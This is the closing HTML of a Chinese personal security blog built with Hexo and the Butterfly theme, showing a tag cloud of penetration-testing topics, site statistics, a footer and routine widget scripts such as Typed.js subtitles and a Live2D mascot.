class="card-tag-cloud"><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.1em; color: rgb(171, 154, 157)">反序列化</a><a href="/tags/%E5%8F%8D%E5%BC%B9shell/" style="font-size: 1.3em; color: rgb(29, 113, 153)">反弹shell</a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 1.1em; color: rgb(18, 153, 37)">证书</a><a href="/tags/CNVD/" style="font-size: 1.1em; color: rgb(144, 21, 76)">CNVD</a><a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 1.1em; color: rgb(91, 53, 97)">命令执行</a><a href="/tags/WAF/" style="font-size: 1.1em; color: rgb(46, 123, 152)">WAF</a><a href="/tags/tamper/" style="font-size: 1.1em; color: rgb(90, 23, 64)">tamper</a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.3em; color: rgb(58, 20, 176)">SQL注入</a><a href="/tags/wordpress/" style="font-size: 1.1em; color: rgb(81, 47, 133)">wordpress</a><a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" style="font-size: 1.1em; color: rgb(186, 80, 171)">任意文件下载</a><a href="/tags/getshell/" style="font-size: 1.1em; color: rgb(85, 133, 135)">getshell</a><a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 1.3em; color: rgb(3, 104, 77)">渗透</a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.1em; color: rgb(63, 85, 173)">sql注入</a><a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 1.5em; color: rgb(79, 178, 35)">靶机</a></div></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">11</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2020-10-09T04:00:00.000Z"></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2021-03-21T09:06:29.290Z"></div></div></div></div></div></div></main><footer id="footer" style="background-color: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By wh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function subtitleType () {
+  if (true) { 
+    var typed = new Typed("#subtitle", {
+      strings: "世界上没有什么偶然的，所有的奇迹和幸福都是靠自己去创造的。,我一边踉跄前行，一边重整旗鼓。,只要慢慢爬，每天朝目标接近一点，总有一天会抵达的。,没有不可治愈的伤痛，没有不能结束的沉沦，所有失去的，会以另一种方式归来。,你必须十分努力，才能看起来毫不费力。".split(","),
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: true,
+      backSpeed: 50
+    })
+  } else {
+    document.getElementById("subtitle").innerHTML = '世界上没有什么偶然的，所有的奇迹和幸福都是靠自己去创造的。'
+  }
+}
+
+if (true) {
+  if (typeof Typed === 'function') {
+    subtitleType()
+  } else {
+    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
+  }
+} else {
+  subtitleType()
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
